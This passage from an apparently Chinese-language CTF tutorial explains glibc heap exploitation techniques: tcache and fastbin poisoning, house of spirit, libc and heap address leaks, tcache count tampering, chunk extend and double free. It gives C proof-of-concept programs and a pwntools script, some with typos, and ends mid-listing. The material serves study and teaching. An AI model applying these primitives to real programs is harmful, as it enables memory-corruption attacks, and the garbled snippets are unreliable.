class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr[<span class="hljs-number">7</span>];<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br><span class="hljs-comment">// 申请7个，释放7个，填满tcache bin[0x90]</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++)<br>        ptr[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++)<br>        <span class="hljs-built_in">free</span>(ptr[i]);<br>    <span class="hljs-comment">// 这里再释放a，就会放入到unsorted bin中</span><br>    <span class="hljs-built_in">free</span>(a);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;libc addr is %llx\n&quot;</span>,  *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>*)a);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/thcache-bypass.png"></p><p>如上我们就泄露出了 main_arena 的地址，接下来就可以通过ret2libc时用到的套路泄露libc基址进而调用目标函数啦。</p><h4 id="分配堆到指定的地址"><a href="#分配堆到指定的地址" class="headerlink" title="分配堆到指定的地址"></a>分配堆到指定的地址</h4><p>在堆的利用中，我们经常会需要把堆的指针分配到我们想要的地址上去，比如BSS段或者直接指向栈空间实现程序流的操控，抑或是将堆块重新分配。</p><p>我们可以通过以下几种方法实现：</p><h5 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h5><p>tcache poisoning的利用思路如下：</p><ul><li><p>分配一个目标大小的堆块，再将其释放</p></li><li><p>利用堆溢出等漏洞，将刚刚释放的堆块的某个指针（例如 <code>fd</code> 或 <code>bk</code> ）修改为我们可控的地址指针（如 <code>__free_hook </code>或 <code>__malloc_hook</code> 等局部变量的地址）。</p></li><li><p>再次建立相同大小的堆块并释放，这样该堆块的内容会被认为是一个有效的 tcache 链表节点。</p></li><li><p>再次建立相同大小的堆块，此时 tcache 会将之前填充的目标指针地址作为返回值返回给调用者，我们可以在这段地址内写入攻击代码，程序执行到目标地址，就可以实现任意代码执行。</p><blockquote><p>因为 fd 指针会返回空闲堆块地址给程序，而这个地址被我们替换成了目标地址，所以实际上返回值是目标地</p></blockquote></li></ul><p> 原理大致如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> localVariables ;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;localVariables addr is %p\n&quot;</span>, &amp;localVariables);<br><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> * ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc ptr addr is %p\n&quot;</span>, ptr);<br>    <span class="hljs-built_in">free</span>(ptr);<br>    <span class="hljs-comment">// 只需修改fd指针，申请的大小和当前tcache bin大小相同即可</span><br>    ptr[<span class="hljs-number">0</span>] = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)&amp;localVariables;<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the second malloc addr is %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/tcachePoisoning.png"></p><h5 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache house of spirit"></a>tcache house of spirit</h5><p>tcache house of spirit 这种利用方式是由于 tcache_put() 函数检查不严格导致的，在释放的时候没有检查被释放的指针是否真的是堆块的 malloc 指针，我们就可以伪造一个 fake_chunk 来跳转到目标地址。</p><p>利用思路是伪造一个 size 符合 tcache bin size 的 fake_chunk ，使程序在释放时误以为他们属于 tcache 的管理范围，就实现了任意地址的目的的。</p><p>原理大致如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> fck[<span class="hljs-number">4</span>];<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">// 初始化堆环境</span><br>    <br>    <span class="hljs-comment">// 伪造假堆块，试图释放后再次分配得到该地址的堆块</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fck addr is %p\n&quot;</span>, fck+<span class="hljs-number">2</span>);<br>    fck[<span class="hljs-number">1</span>] = <span class="hljs-number">0x90</span>;<br>    <span class="hljs-built_in">free</span>(fck+<span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;now malloc addr is %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/tcacheHouseOfSpirit.png"></p><h4 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h4><p>在做堆题时，经常会遇到保护全开的情况，特别是地址随机化保护PIE，或者题目本身没有明显可利用的打印函数，这时就需要采取一些机制来泄露出libc地址或者堆地址等。</p><h5 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h5><p>泄露 libc 利用的就是 bin 中双向链表的性质，当一个堆块被加入链表时，它的 fd 和 bk 指针会指向 libc 中的地址。在“绕过 tcache”中我们就是利用了这个特性来泄露的 libc 地址。</p><p>还有更加直接的方法，只需要让分配和释放的chunk 大于等于 0x410字节（超过 tcache 的范围）即可。需要注意的是，这时我们需要防止释放的堆块和 top chunk 合并。</p><p>原理大致如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> * ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);  <span class="hljs-comment">// 防止堆块合并</span><br>    <span class="hljs-built_in">free</span>(ptr);  <span class="hljs-comment">//释放的堆块进入 unsorted bin</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak libc addr is %p\n&quot;</span>, (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/tcachelibc.png"></p><h5 id="泄露-heap-地址"><a href="#泄露-heap-地址" class="headerlink" title="泄露 heap 地址"></a>泄露 heap 地址</h5><p>除了泄露 libc 地址，我们还可以泄露 heap 地址。在泄露堆地址以后，我们确定好目标地址的偏移，再通过修改 tcache bin 的 fd 指针，就可以在下次分配时分配到我们想要的堆块。</p><blockquote><p>在 libc-2.28 中，增加了对 tcache 二次释放的检查，所以此种攻击方法在 libc-2.28 及其更高版本中失效</p></blockquote><p>原理大致如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">free</span>(ptr);<br>    <span class="hljs-built_in">free</span>(ptr);  <span class="hljs-comment">// double free !!</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;heap addr is %p\n&quot;</span>, ptr[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>double free 错误提示了，换了三个版本的 Libc 都木有用，先放着碰到题目再说🫥</p></blockquote><p>还有另一种方法，我们利用 malloc 不会清除内存空间的特性以及 printf 格式化字符串遇到字符 “\x00” 才会停止的特性去泄露 heap base 。</p><p>题目示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-built_in">free</span>(p1);<br>    <span class="hljs-built_in">free</span>(p2);<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    read(<span class="hljs-number">0</span>, p3, <span class="hljs-number">0x20</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, p3);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./heap&quot;</span>)<br>p.send(<span class="hljs-string">&quot;a&quot;</span>)<br>info = p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>, drop=<span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(info)<br>info = u64(info.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>heap_base = info &amp; <span class="hljs-number">0xfffffffffffff000</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;heap base: &quot;</span>, <span class="hljs-built_in">hex</span>(heap_base))<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/tcacheheap_exp.png"></p><h5 id="利用-tcache-bin-记录堆块泄露地址"><a href="#利用-tcache-bin-记录堆块泄露地址" class="headerlink" title="利用 tcache bin 记录堆块泄露地址"></a>利用 tcache bin 记录堆块泄露地址</h5><p>有的时候题目会限制free的次数，我们无法通过多次释放来填满 tcache bin 。这种情况我们就可以结合 tcache bin 的特性。我们知道，在初始化堆的时候， tcache bin 会生成一块 0x250 大小的堆块来记录属于 tcache bin 大小的堆块信息。我们修改这里的记录，就可以把后续释放的堆块放进 unsorted bin 中。</p><p>方法一：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr;<br><br>    ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);<br><br>    <span class="hljs-comment">// double free</span><br>    <span class="hljs-built_in">free</span>(ptr);<br>    <span class="hljs-built_in">free</span>(ptr);<br><br>    <span class="hljs-comment">// malloc 3 ==&gt; tcache bin count = -1</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">free</span>(ptr);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>上方代码中，我们通过利用 double free 让一个堆块自身构成循环，然后 malloc 3次后就可以让 tcache bin 的记录变为 -1，由于 libc 源代码是认定为无符号整型所以此时也就是一个非常大的数，自然也就认为该 tcache bin 是被填满了的。最后再 free 相同大小的堆块，就会被释放到相应的bin中。<br>方法二：</p><p>直接修改记录信息。利用double free泄露出heap地址，计算偏移并求出记录该tcache bin的地址，然后利用tcache bin poison将堆块分配到这里进行修改。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;srdlb.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr;<br>    <br>    ptr = malooc(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);<br>    ptr[<span class="hljs-number">-74</span>]=<span class="hljs-number">0x0700000000000000</span>;    <span class="hljs-comment">//这里是我们自己计算出的偏移</span><br>    <span class="hljs-built_in">free</span>(ptr);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>上方代码中我们将记录块修改为0x07这样就会被认为是已经填满了七块堆块，下一个 free 掉的堆块就会进入相应的区域。</p><h4 id="tcache-extend"><a href="#tcache-extend" class="headerlink" title="tcache extend"></a>tcache extend</h4><p>其实就是我们可以通过释放堆块后对其数据进行修改。其中由于tcache机制的加入使得漏洞利用更简单。chunk extend 也更加的轻松，只需要修改当前chunk的size，我们free再malloc后就可以获得对应大小的chunk。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;addr is %p, size is %p\n&quot;</span>, p1, p1[<span class="hljs-number">-1</span>]);<br>    p1[<span class="hljs-number">-1</span>] = <span class="hljs-number">0xa1</span>;<br>    <span class="hljs-built_in">free</span>(p1);<br>    p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;addr is %p, size is %p\n&quot;</span>, p1, p1[<span class="hljs-number">-1</span>]);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/tcache_extend2.png"></p><h1 id="Fastbin-attack"><a href="#Fastbin-attack" class="headerlink" title="Fastbin attack"></a>Fastbin attack</h1><blockquote><p>这一部分我的环境是 ubuntu16 libc2.23</p></blockquote><p>简单回顾一下 fast bin 的特性：</p><ul><li>属于fast bin 的 chunk 大小在 64 位下是 0x20-0x80，每一条 bin 链表以 0x10 递增，共计七条链；32 位是 0x10-0x40 ，以 0x8 递增。</li><li>fast bin 是单链表且先进后出，就是说在 fast bin 中只有 fd 指针会被使用。</li><li>属于 fast bin 的 chunk 被释放时不会被 unlink ，不会和堆块进行合并，即使紧邻 Top chunk。</li></ul><h3 id="fast-bin-posioning"><a href="#fast-bin-posioning" class="headerlink" title="fast bin posioning"></a>fast bin posioning</h3><blockquote><p>其实和之前 tcache 的方法是一样的，只不过我们现在的环境是 libc2.23 没有 tcache😊</p></blockquote><p>这种攻击方法的目的就是将堆块分配到我们想要控制的内存区域，再通过题目所给的编辑堆块的功能来修改这一部分的内存区域。</p><p>实现攻击目标，首先要在目标区域为造出一个堆块，将伪造堆块的size大小设置为要申请的chunk大小+0x10，然后将伪造堆块的地址填入对应大小的bin链中，之后正常申请堆块即可。</p><p>大致原理如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> fck[<span class="hljs-number">4</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;stack addr is %p\n&quot;</span>, fck);<br><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">free</span>(ptr);<br>    fck[<span class="hljs-number">1</span>] = <span class="hljs-number">0x21</span>;           <br>    ptr[<span class="hljs-number">0</span>] = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fck;  <span class="hljs-comment">//把fck指针写入fd指针</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the original heap %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;alloc to the stack %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastbp.png"></p><p>如上代码，我们修改了 fd 指针，使得 fd 指针指向了 ptr[0]。这样我们再次分配大小为 0x10 的堆块时，会从被修改的 fd 指针指向的地址处获取堆块，并返回给我们。</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastbp_gdb1.png"></p><blockquote><p>因为我们写入到 fd 指针的是 fck 的地址，也就是伪造堆块的头地址，而 malloc 返回的是用户数据地址，所以两个地址相差0x10</p></blockquote><h3 id="fast-bin-house-of-spirit"><a href="#fast-bin-house-of-spirit" class="headerlink" title="fast bin house of spirit"></a>fast bin house of spirit</h3><p>House of Spirit 这种技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。</p><p>我们需要注意的是，系统对 chunk 会有相应的检查，我们需要绕过检查。相关数据如下：</p><ul><li><p>fake chunk 的 IS_MAPPED 不能为 1</p><p>这个标志位位于size低二比特位。标志位是 1 代表堆块由 mmap 分配，而 mmap 分配的堆块不进入 fast bin 管理。</p></li><li><p>地址对齐</p><p>比如32位程序的话fake_chunk的prev_size所在地址就应该位 <code>0xXXXX0</code> 或 <code>0xXXXX4</code>。64位的话地址就应该在 <code>0xXXXX0</code> 或 <code>0xXXXX8</code> 。</p></li><li><p>大小对齐</p><p>需要满足 fsat bin 的尺寸要求，大小不能大于0x80。</p></li><li><p>next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于 av-&gt;system_mem</p><p>最大不能超过 av-&gt;system_mem ，即 128kb。next_chunk 的大小一般我们会设置成为一个超过 fast bin 最大的范围的一个数，但要小于 128kb，这样做的目的是在 chunk 连续释放的时候，能够保证伪造的 chunk 在释放后能够挂在 fast bin 中 main_arena 的前面，这样以来我们再一次申请伪造 chunk 大小的块时可以直接重启伪造 chunk。</p></li><li><p>不能构成 double free 的情况</p><p>fake_chunk前一个释放块不能是fake_chunk本身，如果是的话_int_free函数就会检查出来并且中断</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> fck[<span class="hljs-number">6</span>] __attribute__ ((aligned(<span class="hljs-number">16</span>)));    <span class="hljs-comment">//对齐</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fck addr is %p\n&quot;</span>,fck);<br>    <br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);<br>    fck[<span class="hljs-number">1</span>] = <span class="hljs-number">0x21</span>;   <span class="hljs-comment">//该 chunk 的大小</span><br>    fck[<span class="hljs-number">5</span>] = <span class="hljs-number">0x21</span>;   <span class="hljs-comment">//下一个 chunk 的大小</span><br>    <span class="hljs-built_in">free</span> (&amp;fck[<span class="hljs-number">2</span>]);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;new malloc addr is %p\n&quot;</span>,<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fasthouse.png"></p><p>我们在 gdb 里面走一遍</p><p>首先分配 fake chunk ，我们查看该地址的内存信息（我编译的时候开了保护所以每一次运行的地址不一样）</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fasthouse-gdb1.png"></p><p>在执行完赋值操作以后就变成了这样</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fasthouse-gdb2.png"></p><h3 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h3><p>所谓 double free 就是同一个堆被分配两次，其实不仅仅是两次也可以是多次，也就是说被释放的 chunk 在 fast bin 中出现多次。这样之后我们可以从 fast bin 链表中取出同一个堆块，结合堆块的数据内容可以实现类似于类型混淆的效果啦。 同样，因为两次释放的同一个堆块会将指针指向自己，所以我们也可以用来泄露 heap 的地址。</p><p>double free 能够成功的原因主要有两部分：</p><ul><li>fast bin 的堆块被释放以后 next_chunk 的 prev_inuse 位不会被清空</li><li>fast bin 在执行 free 的时候仅仅验证了 main_area 直接指向的块，即链表指针头部的块。</li></ul><p>演示说明：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 